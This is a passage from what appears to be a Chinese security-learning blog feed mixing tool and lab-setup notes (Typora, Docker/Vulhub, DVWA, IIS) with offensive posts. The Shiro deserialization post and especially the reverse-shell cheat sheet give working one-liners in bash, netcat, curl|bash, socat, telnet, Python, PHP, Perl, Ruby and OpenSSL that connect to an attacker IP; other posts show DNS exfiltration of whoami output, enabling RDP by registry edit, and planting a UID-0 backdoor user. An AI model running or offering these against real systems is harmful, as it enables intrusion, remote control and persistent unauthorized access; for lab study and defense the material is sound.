<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
<p>缺点：多点登陆失效。</p>
<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Redis未授权访问</tag>
        <tag>Python脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>Typora常用快捷键</title>
    <url>/article/12a67745.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>快捷键</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+T</td>
<td>插入表格</td>
</tr>
<tr>
<td>Ctrl+Shift+K</td>
<td>插入代码块</td>
</tr>
<tr>
<td>Ctrl+0</td>
<td>段落</td>
</tr>
<tr>
<td>Ctrl+1-6</td>
<td>1-6级标题</td>
</tr>
<tr>
<td>Ctrl+Enter</td>
<td>表格下方插入行</td>
</tr>
<tr>
<td>Ctrl+/</td>
<td>源码编辑</td>
</tr>
<tr>
<td>Ctrl+Shift+V</td>
<td>粘贴为纯文本</td>
</tr>
</tbody></table>
<p>文件-偏好设置-高级设置-conf.user.json    重新设置快捷键</p>
<pre class="highlight"><span class="line">&quot;keyBinding&quot;: &#123;</span><br><span class="line">    // for example: </span><br><span class="line">    // &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;</span><br><span class="line">    &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;,  </span><br><span class="line">    &quot;Code Fences&quot;: &quot;Ctrl+Shift+F&quot;,  </span><br><span class="line">    &quot;Ordered List&quot;:&quot;Ctrl+Alt+o&quot;,  </span><br><span class="line">    &quot;Unordered List&quot;: &quot;Ctrl+Alt+u&quot;  </span><br><span class="line">  &#125;,</span><br></pre>

<p>附件，快捷键对照表</p>
<p> <img src="/article/image-20210620140349383.png" alt="image-20210620140349383" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140349383.png" class="lozad post-image"></p>
<p><img src="/article/image-20210620140429130.png" alt="image-20210620140429130" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140429130.png" class="lozad post-image"></p>
]]></content>
      <categories>
        <category>附加</category>
      </categories>
      <tags>
        <tag>Typora</tag>
      </tags>
  </entry>
  <entry>
    <title>Shiro反序列化漏洞复现</title>
    <url>/article/12dfe94f.html</url>
    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>

<p>b、使用xray检测，直接发送payload</p>
<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>

<p>或指定脚本检测</p>
<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>

<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro反序列</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu安装Python3</title>
    <url>/article/5e5d43b.html</url>
    <content><![CDATA[<p>1、卸载旧版python</p>
<pre class="highlight"><span class="line">sudo apt-get remove python</span><br></pre>

<p>2、安装新版python</p>
<pre class="highlight"><span class="line">sudo apt-get install python3</span><br></pre>

<p>3、切换默认python环境</p>
<pre class="highlight"><span class="line">echo alias python=python3 &gt;&gt; ~/.bashrc  #切换python默认版本类型</span><br><span class="line">source ~/.bashrc  						#更新配置文件的命令，只更新当前终端上的配置</span><br></pre>

<p>4、查看默认的python版本</p>
<pre class="highlight"><span class="line">python --version</span><br></pre>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Python3</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu搭建Docker + Vulhub</title>
    <url>/article/a438e427.html</url>
    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><p>1、在线安装docker</p>
<pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">docker -v	#查看版本</span><br></pre>

<p>2、安装pip</p>
<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>

<p>3、安装docker-compose</p>
<pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>

<p>4、拉取vulhub</p>
<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>



<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><p>1、查看正在运行的容器信息</p>
<pre class="highlight"><span class="line">docker ps</span><br></pre>

<p>2、进入容器目录</p>
<pre class="highlight"><span class="line">docker attach +容器ID</span><br><span class="line">或docker exec -it +容器ID /bin/bash</span><br></pre>

<p>3、退出容器</p>
<pre class="highlight"><span class="line">exit</span><br></pre>



<p>其他命令：</p>
<pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>

]]></content>
      <categories>
        <category>Linxu</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows多个Java环境共存</title>
    <url>/article/5915dfc0.html</url>
    <content><![CDATA[<h1 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>

<p>3、新建 CLASSPATH</p>
<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>

<p>4、修改 Path</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre>

<p>5、重启</p>
<p>其他：Path中改单行显示为多行显示，需要将其中一个绝对路径变量放在行首，如</p>
<pre class="highlight"><span class="line">C:\Windows\System32;		#低版本Windows系统不支持</span><br></pre>



<h1 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h1><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk-11.0.10		#根据具体路径更改</span><br></pre>

<p>3、修改 Path</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br></pre>



<h1 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h1><p>1、新建JAVA_HOME、JAVA_HOME8、JAVA_HOME11</p>
<p>2、新建java8.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME8%&quot; /m</span><br></pre>

<p>3、新建java11.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA_HOME11%&quot; /m</span><br></pre>

]]></content>
      <tags>
        <tag>Java环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透随记</title>
    <url>/article/3d2e94d4.html</url>
    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
<p><a href="http://dnslog.cn/">http://dnslog.cn/</a>        #需要生成随机DNS</p>
<p>使用：</p>
<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>

<p>（注：``为优先运行符，可以用$()代替）</p>
<p>适用：</p>
<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
<p>开启：</p>
<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>

<p>关闭：</p>
<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>

]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows随记</title>
    <url>/article/afc45429.html</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>netstat -r</td>
<td>列出当前路由信息</td>
</tr>
<tr>
<td>dir</td>
<td>显示文件列表，同linux下ls</td>
</tr>
<tr>
<td>mkdir或mk</td>
<td>创建目录</td>
</tr>
<tr>
<td>rmdir或rd</td>
<td>删除目录</td>
</tr>
<tr>
<td>copy</td>
<td>复制，需要指定目录</td>
</tr>
<tr>
<td>del</td>
<td>删除</td>
</tr>
<tr>
<td>touch</td>
<td>创建文件</td>
</tr>
<tr>
<td>ren</td>
<td>重命名</td>
</tr>
<tr>
<td>type</td>
<td>查看文本文件</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows搭建IIS + mssql</title>
    <url>/article/ddd2791b.html</url>
    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
<p>修改网站访问端口号</p>
<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
<thead>
<tr>
<th>报错类型</th>
<th>做法</th>
</tr>
</thead>
<tbody><tr>
<td>403（无访问主程序）</td>
<td>修改默认文档，增加index.asp</td>
</tr>
<tr>
<td>500（无法访问文件）</td>
<td>ASP-启用父路径</td>
</tr>
<tr>
<td>提示未启用32位程序池</td>
<td>应用程序池-网站-高级设置-32位应用程序池-True</td>
</tr>
<tr>
<td>没有操作权限</td>
<td>修改www目录权限：  属性-安全-编辑-修改Users权限为完全控制</td>
</tr>
</tbody></table>
<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
<p> <img src="/article/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.png" class="lozad post-image"></p>
<p>2、限制数据库权限（从管理员权限降权）</p>
<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
<p>3、混合模式，设置密码，添加管理员</p>
<p> <img src="/article/3.png" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/3.png" class="lozad post-image"></p>
<p>4、后续全部确认即可</p>
<p>5、新建数据库（testdb）</p>
<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
<p>7、替换网站原有数据库</p>
<p>8、修改网站数据库配置文件</p>
<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
<p>注意：mssql账号为sa</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7搭建DVWA</title>
    <url>/article/bfa55e85.html</url>
    <content><![CDATA[<h1 id="一、准备"><a href="#一、准备" class="headerlink" title="一、准备"></a>一、准备</h1><p>Apache+Mysql+PHP+DVWA</p>
<h1 id="二、环境搭建"><a href="#二、环境搭建" class="headerlink" title="二、环境搭建"></a>二、环境搭建</h1><h2 id="安装Apache（httpd）"><a href="#安装Apache（httpd）" class="headerlink" title="安装Apache（httpd）"></a>安装Apache（httpd）</h2><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>



<p>启动apache并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start httpd  		# 开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd  	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd  	# 查看apache状态</span><br></pre>

<h2 id="安装Mysql"><a href="#安装Mysql" class="headerlink" title="安装Mysql"></a>安装Mysql</h2><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>

<p>启动Mysql并设置开机自启</p>
<pre class="highlight"><span class="line">systemctl start mariadb 	 	# 开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb 	 	# 设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb  		# 查看mariadb状态</span><br></pre>

<p>配置Mysql数据库</p>
<p>初始化mysql数据库（全部回车确认）</p>
<pre class="highlight"><span class="line">mysql_secure_installation</span><br></pre>

<p>设置mysql密码（非操作系统密码）</p>
<p>配置</p>
<pre class="highlight"><span class="line">mysql -uroot -p</span><br><span class="line">create database dvwa;			# 创建数据库</span><br><span class="line">grant all privileges on *.* to dvwa@localhost identified by &#x27;dvwa&#x27;;		# 创建用户</span><br></pre>



<h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><p>(php-fpm php-mysqlnd不装，其他均可)</p>
<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>

<p>重启apache使php生效（php不是独立软件，依附apache）</p>
<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>

<p>配置</p>
<pre class="highlight"><span class="line">vim /etc/php.ini</span><br><span class="line">修改allow_url_include=Off为allow_url_include=On</span><br></pre>



<h2 id="安装DVWA"><a href="#安装DVWA" class="headerlink" title="安装DVWA"></a>安装DVWA</h2><pre class="highlight"><span class="line">wget https://github.com/ethicalhack3r/DVWA/archive/master.zip</span><br></pre>

<p>解压并复制到/var/www/html目录</p>
<p>配置</p>
<pre class="highlight"><span class="line">cd /var/www/html/config/</span><br><span class="line">cp config.inc.php.dist config.inc.php		# /DVWA/config目录下</span><br><span class="line">vim config.inc.php				</span><br><span class="line"># 修改密码为dvwa</span><br><span class="line">$_DVWA[ &#x27;recaptcha_public_key&#x27; ]  = &#x27;6LdK7xITAAzzAAJQTfL7fu6I-0aPl8KHHieAT_yJg&#x27;;</span><br><span class="line">$_DVWA[ &#x27;recaptcha_private_key&#x27; ] = &#x27;6LdK7xITAzzAAL_uw9YXVUOPoIHPZLfw2K1n5NVQ&#x27;;</span><br><span class="line"></span><br><span class="line">systemctl restart httpd						# 重启apache</span><br><span class="line"></span><br><span class="line">chown -R apache:apache /var/www/html/</span><br></pre>



<h1 id="三、访问环境"><a href="#三、访问环境" class="headerlink" title="三、访问环境"></a>三、访问环境</h1><pre class="highlight"><span class="line">http:localhost/setup.php</span><br></pre>

<p>创建数据库</p>
<p>登录（admin:password）</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell归纳</title>
    <url>/article/ea7bbfdc.html</url>
    <content><![CDATA[<h1 id="Linux反弹shell归纳"><a href="#Linux反弹shell归纳" class="headerlink" title="Linux反弹shell归纳"></a>Linux反弹shell归纳</h1><p>注意：若是实战环境，反弹shell目标需要为公网ip。（搭服务器）</p>
<h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><p>bash重定向，优先使用。</p>
<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br><span class="line"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></pre>

<p>以下是针对Bash反弹一句话进行了拆分说明：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>命令详解</th>
</tr>
</thead>
<tbody><tr>
<td>bash -i</td>
<td>产生一个bash交互环境。</td>
</tr>
<tr>
<td>&gt;&amp;</td>
<td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td>
</tr>
<tr>
<td>/dev/tcp/47.xxx.xxx.72/2333</td>
<td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td>
</tr>
<tr>
<td>0&gt;&amp;1</td>
<td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td>
</tr>
</tbody></table>
<p>Bash反弹一句完整的解读过程就是：</p>
<p>Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。</p>
<p>1、开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机反弹连接攻击机</p>
<pre class="highlight"><span class="line">bash -c &quot;bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1&quot;</span><br></pre>



<h5 id="注意：利用工具写入反弹shell时，命令如下："><a href="#注意：利用工具写入反弹shell时，命令如下：" class="headerlink" title="注意：利用工具写入反弹shell时，命令如下："></a>注意：利用工具写入反弹shell时，命令如下：</h5><p>bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=}|{base64,-d}|{bash,-i}</p>
<p>其中，加密部分为bash -i &gt;&amp;  /dev/tcp/192.168.66.138/1111 0&gt;&amp;1的base64编码。IP、端口修改时需重新进行base64加密</p>
<h2 id="netcat反弹shell"><a href="#netcat反弹shell" class="headerlink" title="netcat反弹shell"></a>netcat反弹shell</h2><p>1、linux默认自带netcat工具，但是反弹shell功能-e参数通常被阉割，需要手动下载二进制安装包。</p>
<pre class="highlight"><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre>

<p>2、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">netcat -lvvp 1111</span><br></pre>

<p>3、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">netcat 192.168.66.138 1111 -e /bin/bash</span><br><span class="line"># netcat &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br></pre>





<h2 id="Curl-Bash反弹shell"><a href="#Curl-Bash反弹shell" class="headerlink" title="Curl+Bash反弹shell"></a>Curl+Bash反弹shell</h2><p>借助Linux管道命令。</p>
<p>1、在攻击者vps（公网）的web目录里面创建一个index文件（index.php或index.html），内容如下：</p>
<pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>

<p>2、开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>3、在目标机器上执行如下代码，即可反弹shell</p>
<pre class="highlight"><span class="line">curl 192.168.66.138|bash</span><br></pre>

<p>curl IP | bash中的IP可以是任何形式（十进制、十六进制、八进制、二进制等）</p>
<h2 id="Socat反弹shell"><a href="#Socat反弹shell" class="headerlink" title="Socat反弹shell"></a>Socat反弹shell</h2><p>1、安装</p>
<pre class="highlight"><span class="line">apt-get install socat</span><br></pre>

<p>2、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">socat TCP-LISTEN:1111 -</span><br><span class="line">或nc -lvvp 1111</span><br></pre>

<p>3、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">socat tcp-connect:192.168.66.138:1111 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre>





<h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和/dev/tcp不可用时，且目标机和攻击机都开启telnet（23端口）服务时，可用telnet反弹shell。</p>
<p>方法一：</p>
<p>1、攻击机开启本地监听：</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">mknod a p;telnet 192.168.66.138 1111 0&lt;a | /bin/bash 1&gt;a</span><br></pre>



<p>方法二：</p>
<p>1、攻击机开启两个本地监听：</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br><span class="line">nc -lvvp 2222</span><br></pre>

<p>2、目标机主动连接攻击机：</p>
<p>telnet 192.168.66.138 1111 | /bin/bash | telnet 192.168.66.138 2222</p>
<p>3、攻击机1111端口执行命令，2222端口回显命令</p>
<h2 id="Python脚本反弹shell"><a href="#Python脚本反弹shell" class="headerlink" title="Python脚本反弹shell"></a>Python脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.66.138&quot;,1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre>





<h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机：</p>
<pre class="highlight"><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.66.138&quot;,1111);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre>





<h2 id="Perl脚本反弹shell（后缀-pl）"><a href="#Perl脚本反弹shell（后缀-pl）" class="headerlink" title="Perl脚本反弹shell（后缀.pl）"></a>Perl脚本反弹shell（后缀.pl）</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.66.138&quot;;$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre>





<h2 id="Ruby脚本反弹shell（后缀-rb）"><a href="#Ruby脚本反弹shell（后缀-rb）" class="headerlink" title="Ruby脚本反弹shell（后缀.rb）"></a>Ruby脚本反弹shell（后缀.rb）</h2><p>1、攻击机开启本地监听</p>
<pre class="highlight"><span class="line">nc -lvvp 1111</span><br></pre>

<p>2、目标机主动连接攻击机</p>
<pre class="highlight"><span class="line">ruby -rsocket -e &#x27;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.66.138&quot;,&quot;1111&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></pre>





<h2 id="Metasploit生成反弹shell"><a href="#Metasploit生成反弹shell" class="headerlink" title="Metasploit生成反弹shell"></a>Metasploit生成反弹shell</h2><p>1、自动生成反弹一句话</p>
<pre class="highlight"><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=192.168.66.138 LPORT=1111 -f raw</span><br></pre>

<p>其中，cmd/unix/reverse_python为python类型反弹命令，其他类型直接更改_后缀即可，如cmd/unix/reverse_perl生成perl反弹shell</p>
<p>2、将生成的反弹shell直接在目标机器上执行即可</p>
<h2 id="OpenSSL反弹加密shell"><a href="#OpenSSL反弹加密shell" class="headerlink" title="OpenSSL反弹加密shell"></a>OpenSSL反弹加密shell</h2><p>1、攻击机生成自签名证书：（填写信息全部回车即可）</p>
<pre class="highlight"><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre>

<p>2、在攻击机上使用OpenSSL监听一个端口</p>
<pre class="highlight"><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 1111</span><br></pre>

<p>3、在目标机上进行反弹shell</p>
<pre class="highlight"><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s</span><br></pre>





<h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
<p>1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p>
<p>2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p>
<p>3、获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p>
<p>若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：</p>
<pre class="highlight"><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre>

]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>添加用户并提权</title>
    <url>/article/703195e5.html</url>
    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>



<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>

<p>b、然后修改用户，使其属于root组</p>
<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>

<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>

<p>b、使用test账号登录，即可使用sudo权限操作</p>
<p>如：sudo ls</p>
<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>

<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>



